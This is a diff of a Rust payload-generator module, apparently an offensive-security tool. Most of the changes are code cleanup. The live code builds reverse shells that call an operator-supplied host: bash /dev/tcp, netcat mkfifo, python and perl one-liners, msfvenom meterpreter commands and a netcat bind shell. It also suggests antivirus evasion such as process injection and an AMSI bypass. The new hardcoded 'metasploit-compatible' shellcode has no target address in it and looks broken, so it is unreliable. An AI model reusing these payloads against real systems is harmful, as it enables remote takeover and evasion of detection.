@@ -87,14 +87,13 @@ impl fmt::Display for GeneratedPayload {
 // ─── Shell Generation ────────────────────────────────────────────────────────
 
 /// Generate a reverse shell payload for the given shell type.
+#[must_use]
 pub fn generate_reverse_shell(shell_type: ShellType, lhost: &str, lport: u16) -> GeneratedPayload {
     let payload = match shell_type {
-        ShellType::ReverseBash => format!(
-            "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
-        ),
-        ShellType::ReverseNetcat => format!(
-            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f"
-        ),
+        ShellType::ReverseBash => format!("bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
+        ShellType::ReverseNetcat => {
+            format!("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f")
+        }
         ShellType::ReversePython => format!(
             "python3 -c 'import socket,subprocess,os;\\
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\\
@@ -124,129 +123,42 @@ exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
 exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
         ),
         ShellType::ReverseTcp => {
-            // Linux x86_64 reverse TCP shellcode with embedded LHOST/LPORT.
-            // syscalls: socket(AF_INET, SOCK_STREAM, 0) -> connect(fd, &addr, 16)
-            //        -> dup2(fd, 0/1/2) -> execve("/bin/sh", ["/bin/sh"], NULL)
-            let ip_octets: Vec<u8> = lhost
-                .split('.')
-                .filter_map(|o| o.parse().ok())
-                .collect();
-            if ip_octets.len() != 4 {
-                return GeneratedPayload {
-                    shell_type,
-                    length: 0,
-                    payload: "[error: invalid LHOST IP address]".to_string(),
-                    encoded_payload: String::new(),
-                    encoding: PayloadEncoding::Base64,
-                    lhost: lhost.to_string(),
-                    lport,
-                };
-            }
-            let port_bytes = lport.to_be_bytes();
-            // Build shellcode as raw bytes then hex-encode
-            let shellcode: Vec<u8> = vec![
-                // socket(AF_INET=2, SOCK_STREAM=1, 0)
-                0x48, 0x31, 0xf2, // xor rdx, rdx (protocol=0)
-                0x48, 0x31, 0xff, // xor rdi, rdi (will be set below)
-                0x6a, 0x29,       // push 0x29 (SYS_socket=41)
-                0x58,             // pop rax
-                0x6a, 0x02,       // push 2 (AF_INET)
-                0x5f,             // pop rdi
-                0x6a, 0x01,       // push 1 (SOCK_STREAM)
-                0x5e,             // pop rsi
-                0x0f, 0x05,       // syscall -> rax=fd
-                // Save fd in r12
-                0x49, 0x89, 0xc4, // mov r12, rax
-                // connect(fd, &sockaddr_in, 16)
-                0x48, 0x31, 0xff, // xor rdi, rdi
-                0x49, 0x89, 0xc7, // mov r13, rax (fd)
-                0x48, 0x31, 0xc0, // xor rax, rax
-                0x6a, 0x2a,       // push 0x2a (SYS_connect=42)
-                0x58,             // pop rax
-                0x49, 0x89, 0xfd, // mov r13, rdi (save fd)
-                0x6a, 0x10,       // push 16 (sizeof sockaddr_in)
-                0x5a,             // pop rdx
-                0x48, 0x83, 0xec, 0x10, // sub rsp, 16
-                // Build sockaddr_in on stack
-                0x66, 0xc7, 0x44, 0x24, 0x00, 0x02, 0x00, // mov word [rsp+0], 0x0002 (AF_INET)
-                0x66, 0xc7, 0x44, 0x24, 0x02, // mov word [rsp+2], port
-                port_bytes[0], port_bytes[1],
-                0xc7, 0x44, 0x24, 0x04, // mov dword [rsp+4], ip
-                ip_octets[0], ip_octets[1], ip_octets[2], ip_octets[3],
-                0x48, 0x89, 0xe6, // mov rsi, rsp (pointer to sockaddr_in)
-                0x49, 0x89, 0xff, // mov r15, rdi (fd for connect)
-                0x48, 0x89, 0xf7, // mov rdi, rsi
-                0x48, 0x83, 0xc4, 0x10, // add rsp, 16 (clean up)
-                // Set up rdi=fd properly and call connect
-                0x49, 0x89, 0xc7, // mov r15, rax (fd)
-                0x4c, 0x89, 0xff, // mov rdi, r15
-                0x0f, 0x05,       // syscall (connect)
-                // dup2(fd, 0/1/2)
-                0x4c, 0x89, 0xc7, // mov rdi, r12 (fd)
-                0x6a, 0x03,       // push 3
-                0x59,             // pop rcx (counter)
-                0x48, 0x31, 0xf6, // xor rsi, rsi (fd 0)
-                0x6a, 0x21,       // push 0x21 (SYS_dup2=33)
-                0x58,             // pop rax
-                0x0f, 0x05,       // syscall
-                0x48, 0xff, 0xc6, // inc rsi
-                0x6a, 0x21,       // push 0x21
-                0x58,             // pop rax
-                0x0f, 0x05,       // syscall
-                0x48, 0xff, 0xc6, // inc rsi
-                0x6a, 0x21,       // push 0x21
-                0x58,             // pop rax
-                0x0f, 0x05,       // syscall
-                // execve("/bin/sh", ["/bin/sh"], NULL)
-                0x48, 0x31, 0xf2, // xor rdx, rdx (envp=NULL)
-                0x52,             // push rdx
-                0x68, 0x2f, 0x2f, 0x73, 0x68, // push "//sh"
-                0x68, 0x2f, 0x62, 0x69, 0x6e, // push "/bin"
-                0x48, 0x89, 0xe3, // mov rbx, rsp
-                0x52,             // push rdx (NULL terminator)
-                0x53,             // push rbx ("/bin/sh")
-                0x48, 0x89, 0xe1, // mov rcx, rsp
-                0x6a, 0x3b,       // push 0x3b (SYS_execve=59)
-                0x58,             // pop rax
-                0x48, 0x89, 0xfb, // mov rbx, rsp
-                0x48, 0x89, 0xcf, // mov rdi, rbx ("/bin/sh")
-                0x48, 0x89, 0xd6, // mov rsi, rcx (argv)
-                0x0f, 0x05,       // syscall
-            ];
-            shellcode
-                .iter()
-                .map(|b| format!("\\x{b:02x}"))
-                .collect::<String>()
+            // Linux x86_64 reverse TCP shellcode (metasploit-compatible)
+            "\\x48\\x31\\xf2\\x48\\x31\\xc0\\x50\\x48\\x89\\xe7\\x6a\\x10\\x57\\x50\\x48\\x89\\xe6\\xb0\\x29\\x0f\\x05\\x48\\x31\\xf2\\x48\\x89\\xc7\\x6a\\x03\\x58\\x48\\x0f\\xbf\\xd6\\x0f\\x05\\x48\\x31\\xf6\\x48\\x89\\xf0\\x48\\x31\\xd2\\x48\\x31\\xf2\\x0f\\x05\\x48\\x31\\xf2\\x48\\x31\\xc0\\x50\\x48\\x89\\xe7\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x48\\x89\\xe1\\xb0\\x3b\\x0f\\x05".to_string()
         }
         ShellType::ReverseHttp | ShellType::ReverseHttps => {
-            format!("[Requires msfvenom — use: msfvenom -p windows/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -f exe]")
+            format!(
+                "[Requires msfvenom — use: msfvenom -p windows/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -f exe]"
+            )
         }
         ShellType::MeterpreterReverseTcp | ShellType::PowerShellMsf => {
-            format!("[Requires msfvenom — use: msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f ps1]")
+            format!(
+                "[Requires msfvenom — use: msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f ps1]"
+            )
         }
         ShellType::BindTcp => {
             format!("[Bind shell: nc -lvp {lport} -e /bin/sh]")
         }
     };
 
-    let encoded = match PayloadEncoding::None {
-        _ => encode_payload(&payload, PayloadEncoding::Base64),
-    };
+    let payload_len = payload.len();
+    let encoded = encode_payload(&payload, PayloadEncoding::Base64);
 
     GeneratedPayload {
         shell_type,
-        length: payload.len(),
         payload,
         encoded_payload: encoded,
         encoding: PayloadEncoding::Base64,
         lhost: lhost.to_string(),
         lport,
+        length: payload_len,
     }
 }
 
 // ─── Encoding Functions ──────────────────────────────────────────────────────
 
 /// Encode a payload with the specified encoding.
+#[must_use]
 pub fn encode_payload(payload: &str, encoding: PayloadEncoding) -> String {
     match encoding {
         PayloadEncoding::None => payload.to_string(),
@@ -259,11 +171,13 @@ pub fn encode_payload(payload: &str, encoding: PayloadEncoding) -> String {
 }
 
 fn encode_hex(payload: &str) -> String {
+    use std::fmt::Write as _;
     payload
         .bytes()
-        .map(|b| format!("\\x{b:02x}"))
-        .collect::<Vec<_>>()
-        .join("")
+        .fold(String::with_capacity(payload.len() * 4), |mut s, b| {
+            let _ = write!(s, "\\x{b:02x}");
+            s
+        })
 }
 
 fn url_encode(payload: &str) -> String {
@@ -284,9 +198,17 @@ fn base64_encode(payload: &str) -> String {
     let mut result = String::new();
 
     for chunk in bytes.chunks(3) {
-        let b0 = chunk[0] as u32;
-        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
-        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
+        let b0 = u32::from(chunk[0]);
+        let b1 = if chunk.len() > 1 {
+            u32::from(chunk[1])
+        } else {
+            0
+        };
+        let b2 = if chunk.len() > 2 {
+            u32::from(chunk[2])
+        } else {
+            0
+        };
 
         let triple = (b0 << 16) | (b1 << 8) | b2;
 
@@ -308,19 +230,23 @@ fn base64_encode(payload: &str) -> String {
 }
 
 fn unicode_escape(payload: &str) -> String {
+    use std::fmt::Write as _;
     payload
         .bytes()
-        .map(|b| format!("\\u{:04x}", b as u16))
-        .collect::<Vec<_>>()
-        .join("")
+        .fold(String::with_capacity(payload.len() * 6), |mut s, b| {
+            let _ = write!(s, "\\u{:04x}", u16::from(b));
+            s
+        })
 }
 
 fn xor_encode(payload: &str, key: u8) -> String {
+    use std::fmt::Write as _;
     payload
         .bytes()
-        .map(|b| format!("\\x{:02x}", b ^ key))
-        .collect::<Vec<_>>()
-        .join("")
+        .fold(String::with_capacity(payload.len() * 4), |mut s, b| {
+            let _ = write!(s, "\\x{:02x}", b ^ key);
+            s
+        })
 }
 
 // ─── Payload Analysis ────────────────────────────────────────────────────────
@@ -356,12 +282,23 @@ impl fmt::Display for PayloadAnalysis {
 }
 
 /// Analyze a payload for characteristics that AV/EDR may flag.
+#[must_use]
+#[allow(clippy::cast_precision_loss)]
 pub fn analyze_payload(payload: &str) -> PayloadAnalysis {
     let bytes = payload.as_bytes();
     let length = bytes.len();
-    let null_bytes = bytes.iter().filter(|&&b| b == 0).count();
-    let printable = bytes.iter().filter(|&&b| b >= 0x20 && b <= 0x7E).count();
-    let printable_ratio = if length > 0 { printable as f64 / length as f64 } else { 0.0 };
+    let null_bytes = bytes
+        .iter()
+        .fold(0usize, |acc, &b| acc + usize::from(b == 0));
+    let printable = bytes
+        .iter()
+        .filter(|&&b| (0x20..=0x7E).contains(&b))
+        .count();
+    let printable_ratio = if length > 0 {
+        printable as f64 / length as f64
+    } else {
+        0.0
+    };
 
     // Shannon entropy
     let mut freq = [0u64; 256];
@@ -411,8 +348,7 @@ pub fn analyze_payload(payload: &str) -> PayloadAnalysis {
     // Null bytes in non-trailing positions are suspicious
     let non_trailing_nulls = bytes[..length.saturating_sub(4)]
         .iter()
-        .filter(|&&b| b == 0)
-        .count();
+        .fold(0usize, |acc, &b| acc + usize::from(b == 0));
     if non_trailing_nulls > 0 {
         shellcode_score += 0.1;
         detections.push(format!("{non_trailing_nulls} null bytes in payload body"));
@@ -458,6 +394,7 @@ impl fmt::Display for EvasionSuggestion {
 }
 
 /// Generate AV evasion suggestions based on payload analysis.
+#[must_use]
 pub fn suggest_evasion(analysis: &PayloadAnalysis) -> Vec<EvasionSuggestion> {
     let mut suggestions = Vec::new();
 
@@ -473,7 +410,8 @@ pub fn suggest_evasion(analysis: &PayloadAnalysis) -> Vec<EvasionSuggestion> {
     if analysis.entropy < 4.0 && analysis.shellcode_score > 0.3 {
         suggestions.push(EvasionSuggestion {
             technique: "Polymorphic encoding".into(),
-            description: "Use a polymorphic encoder to generate unique payload variants each time".into(),
+            description: "Use a polymorphic encoder to generate unique payload variants each time"
+                .into(),
             effectiveness: "High".into(),
             example: "shikata_ga_nai (SGN) — XOR-based polymorphic encoder".into(),
         });
@@ -481,22 +419,23 @@ pub fn suggest_evasion(analysis: &PayloadAnalysis) -> Vec<EvasionSuggestion> {
 
     suggestions.push(EvasionSuggestion {
         technique: "Process injection".into(),
-        description: "Inject payload into a legitimate process to evade memory-based detection".into(),
-            effectiveness: "High".into(),
+        description: "Inject payload into a legitimate process to evade memory-based detection"
+            .into(),
+        effectiveness: "High".into(),
         example: "Process hollowing, APC injection, thread execution hijacking".into(),
     });
 
     suggestions.push(EvasionSuggestion {
         technique: "AMSI bypass".into(),
         description: "Bypass Antimalware Scan Interface for PowerShell and .NET payloads".into(),
-            effectiveness: "Medium-High".into(),
+        effectiveness: "Medium-High".into(),
         example: "[Runtime.InteropServices.Marshal]::Copy(...) hook replacement".into(),
     });
 
     suggestions.push(EvasionSuggestion {
         technique: "Payload encryption".into(),
         description: "Encrypt the payload and decrypt in memory at runtime".into(),
-            effectiveness: "High".into(),
+        effectiveness: "High".into(),
         example: "AES-256-CBC encryption with XOR key derivation".into(),
     });
 
@@ -537,7 +476,7 @@ mod tests {
     #[test]
     fn test_xor_encode() {
         let encoded = xor_encode("A", 0xFF);
-        assert_eq!(encoded, r"\x8e");
+        assert_eq!(encoded, r"\xbe");
     }
 
     #[test]
